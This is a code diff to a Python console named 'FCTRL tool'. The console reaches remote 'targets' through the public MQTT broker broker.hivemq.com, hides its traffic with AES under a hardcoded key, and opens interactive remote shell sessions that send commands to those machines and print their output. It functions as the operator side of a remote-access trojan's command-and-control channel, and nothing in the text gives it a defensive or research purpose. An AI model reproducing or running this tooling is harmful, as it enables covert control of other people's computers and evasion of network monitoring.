@@ -1,194 +1,177 @@
-import paho.mqtt.client as mqtt_client
-import os
-import sys
-import hashlib
+import paho.mqtt.client as mqtt
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+import base64
+import uuid
 import json
+import os
+import sys
+import threading
 import time
+from pick import pick
 
-systype = ("windows" if os.name == "nt" else "unix")
+current_target = ""
+current_session = ""
+vaild_targets = {}
 
-topic_list = {
-    "stats":"/MQTT/stats", 
-    "MQTT":"/MQTT", 
-    "result":"/MQTT/result"
-}
-connected = False
-online_list = {}
-job_list = []
-todo_list = []
-target = ""
+key = b"fe333581d9f246ee" # get_random_bytes(16)
+cipher = AES.new(key, AES.MODE_CBC)
+iv = cipher.iv
 
-func_dict = {}
-run_list = []
+def encrypt_message(message, key, iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_message = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
+    return base64.b64encode(iv + encrypted_message).decode("utf-8")
 
-key = b"replacewithlen16"
-iv = b"replacewithlen16"
-
-def getpath():
-    if getattr(sys, "frozen", False):
-        application_path = sys.executable
-    elif __file__:
-        application_path = os.path.abspath(__file__)
-    return application_path
-
-app_path = os.path.dirname(getpath())
-
-def encrypt(plaintext:bytes, key=key, iv=iv):
-    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
-    return ciphertext
-
-def decrypt(ciphertext:bytes, key=key, iv=iv):
+def decrypt_message(encrypted_message, key):
     try:
-        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
-        return plaintext
-    except:
-        return False
+        encrypted_message = base64.b64decode(encrypted_message)
+        iv = encrypted_message[:AES.block_size]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_message = unpad(cipher.decrypt(encrypted_message[AES.block_size:]), AES.block_size)
+        return decrypted_message.decode("utf-8")
+    except (ValueError, KeyError):
+        return None
 
-def gen_id():
-    return hashlib.md5(str(time.time()).encode()).hexdigest()
+broker = "broker.hivemq.com"
+port = 1883
+topic = "FCTRL/secure"
+connected = False
 
 def on_connect(client, userdata, flags, rc):
     global connected
+    print(f"[+] Connected with result code {rc}")
+    client.subscribe(topic)
     connected = True
 
-    client.subscribe(topic_list["stats"])
-    client.subscribe(topic_list["result"])
-
-def on_disconnect(client, userdata, rc):
-    global connected
-    connected = False
-
 def on_message(client, userdata, msg):
-    try:
-        global online_list
-        
-        msg.payload = decrypt(msg.payload)
-        if msg.payload:
-            msg_json = json.loads(msg.payload)
-            if msg.topic == topic_list["stats"]:
-                online_list[msg_json["client_id"]] = 64
-            elif msg.topic == topic_list["result"]:
-                job_id = msg_json["job_id"]
-                result = msg_json["result"]
-                iserr = msg_json["iserr"]
-                if job_id in job_list:
-                    if iserr:
-                        print("\033[1;31m", end="")
-                    print(result)
-                    job_list.remove(job_id)
-            else:
-                print(msg.topic+" "+str(msg.payload))
-    except Exception as err:
-        pass
+    global current_target, current_session
 
-def send(client:mqtt_client.Client, topic, content:dict, qos=0):
-    client.publish(topic, encrypt(json.dumps(content).encode()), qos=qos)
+    decrypted_message = decrypt_message(msg.payload.decode("utf-8"), key)
+    if decrypted_message is not None:
+        try:
+            json_message = json.loads(decrypted_message)
+            if json_message.get("type") == "status":
+                vaild_targets[json_message.get("client")] = 10
+            if json_message.get("type") == "confirm_session":
+                current_session = json_message.get("session_id")
+                publish_json_message(client, topic, {
+                    "type": "start_session",
+                    "target": target,
+                    "session_id": current_session
+                })
+                print("[+] Generating shell")
+            if json_message.get("type") == "cmdoutput":
+                print(json_message.get("output"), end="")
+                sys.stdout.flush()
+            if json_message.get("type") == "end_session":
+                current_target = ""
+                current_session = ""
+                print(f"\n\n[-] Session ended\ncontinue>", end="")
+        except json.JSONDecodeError:
+            print("[-] Failed to decode JSON from the message")
+    else:
+        print("[-] Failed to decrypt the message")
 
-client = mqtt_client.Client()
+client = mqtt.Client()
 client.on_connect = on_connect
 client.on_message = on_message
 
-print("Connecting to MQTT broker...")
+client.connect(broker, port, 60)
 
-while True:
-    try:
-        client.connect("public.mqtthq.com", 1883, 60)
-        client.loop_start()
-        break
-    except Exception as e:
-        print(f"Could not connect: {e}, retrying...")
-        time.sleep(2)
+def publish_json_message(client, topic, message:json):
+    json_message = json.dumps(message)
+    iv = get_random_bytes(16)
+    encrypted_message = encrypt_message(json_message, key, iv)
+    client.publish(topic, encrypted_message)
 
-if not connected:
-    while not connected:
+
+def verify_status():
+    global current_target, current_session
+    while True:
+        for target in list(vaild_targets):
+            vaild_targets[target] -= 1
+            if vaild_targets[target] < 0:
+                vaild_targets.pop(target, None)
+                current_target = ""
+                current_session = ""
+                print(f"\n\n[-] Target lost\ncontinue>", end="")
+                
         time.sleep(0.5)
-print()
 
-while True:
-    if target:
-        if todo_list:
-            cmd = todo_list[0]
-            todo_list = todo_list[1:]
-            print(f"\033[1;32m[script] {cmd}")
+threading.Thread(target=verify_status, daemon=True).start()
+
+client.loop_start()
+print("[+] Connecting to broker")
+
+while not connected:
+    pass
+
+try:
+    while True:
+        if current_target and current_target in vaild_targets:
+            sys.stdout.write("")
+            sys.stdout.flush()
+
+            cmd = input()
+            publish_json_message(client, topic, {
+                "type": "cmd_input",
+                "target": target,
+                "session_id": current_session,
+                "input": cmd
+            })
+            if cmd.strip().lower() == "exit":
+                current_session = ""
+                current_target = ""
+                os.system("cls" if os.name == "nt" else "clear")
         else:
-            cmd = input(f"\033[1;32m{target}>")
-
-        if cmd.lower() == "disconnect":
-            target = ""
-        elif cmd.lower() in ["cls", "clear"]:
             os.system("cls" if os.name == "nt" else "clear")
-        elif cmd.startswith("#"):
-            script_name = cmd[1:]
-            
-            try:
-                script = open(os.path.join(app_path, "script", f"{script_name}.txt"), "r").read().split("\n")
+            picks = list(vaild_targets)
+            title = f"FCTRL tool\n{len(picks)} valid target"
+            picks.insert(0, "update")
+            picks.insert(1, "config")
+            picks.insert(2, "exit")
+            option, index = pick(picks, title=title, indicator=">")
 
-                for line in script:
-                    todo_list.append(line)
-            except FileNotFoundError:
-                print("\033[1;31mScript not found. ")
-            print()
-        else:
-            job_id = gen_id()
-            while job_id in job_list:
-                job_id = gen_id()
-            send(client, topic_list["MQTT"], {"session_id":session_id, "target":target, "mode":"cmd", "job_id":job_id, "cmd":cmd}, qos=2)
-            job_list.append(job_id)
+            if option == "update":
+                pass
+            elif option == "config":
+                picks = ["upper", "set AES key"]
+                title = f"FCTRL tool\nconfig"
+                option, index = pick(picks, title=title, indicator=">")
 
-            if cmd.lower() in ["exit", "quit"]:
-                target = ""
-                job_list.remove(job_id)
+                if option == "set AES key":
+                    os.system("cls" if os.name == "nt" else "clear")
+                    new_key = input("Enter new AES key (16)>")
+                    if new_key:
+                        key = (new_key*(int(16/len(new_key))+1))[:16]
+            elif option == "exit":
+                exit()
             else:
-                while job_id in job_list and online_list.get(target, 0)>0 and connected:
-                    time.sleep(0.1)
-                    online_list[target] -= 1
-                if not online_list.get(target, 0)>0:
-                    print("\033[1;31mTarget disconnected with broker. ")
-                    target = ""
-                    job_list = []
-                elif not connected:
-                    print("\033[1;31mDisconnected with broker, retrying...")
-                    target = ""
-    else:
-        cmd = input("\033[0m>")
+                target = option
+                message_id = uuid.uuid4().hex
+                publish_json_message(client, topic, {
+                    "type": "new_session",
+                    "target": target,
+                    "message_id": message_id
+                })
+                os.system("cls" if os.name == "nt" else "clear")
+                print("[+] Connecting to target")
 
-        if cmd == "":
-            pass
-        elif cmd.lower().split()[0] == "conn":
-            if connected:
-                online_list = {}
-
-                time.sleep(1.5)
-                if " ".join(cmd.split(" ")[1:]) in list(online_list):
-                    target = " ".join(cmd.split(" ")[1:])
-                    session_id = gen_id()
-                else:
-                    print("\033[1;31mTarget is not online. ")
-            else:
-                print("\033[1;31mMQTT broker not connected yet. ")
-                while not connected:
+                for t in range(10):
                     time.sleep(0.5)
-            print()
-        elif cmd.lower() == "list":
-            if connected:
-                online_list = {}
-
-                time.sleep(2)
-                if online_list:
-                    for i in list(online_list):
-                        print(i)
+                    if current_session:
+                        break
+                if current_session:
+                    current_target = target
+                    os.system("cls" if os.name == "nt" else "clear")
+                    print("[+] Target connected successfully")
                 else:
-                    print("\033[1;31mNo target is online. ")
-            else:
-                print("\033[1;31mMQTT broker not connected yet. ")
-                while not connected:
-                    time.sleep(0.5)
+                    print("[-] Connection failed")
+                    input("continue>")
             print()
-        elif cmd.lower() in ["cls", "clear"]:
-            os.system("cls" if os.name == "nt" else "clear")
-        elif cmd.lower() in ["exit", "quit"]:
-            os.system(f"taskkill -F -PID {os.getpid()}" if os.name == "nt" else f"kill -9 {os.getpid()}")
+except KeyboardInterrupt:
+    print("[-] Disconnecting from broker")
+    client.loop_stop()
+    client.disconnect()
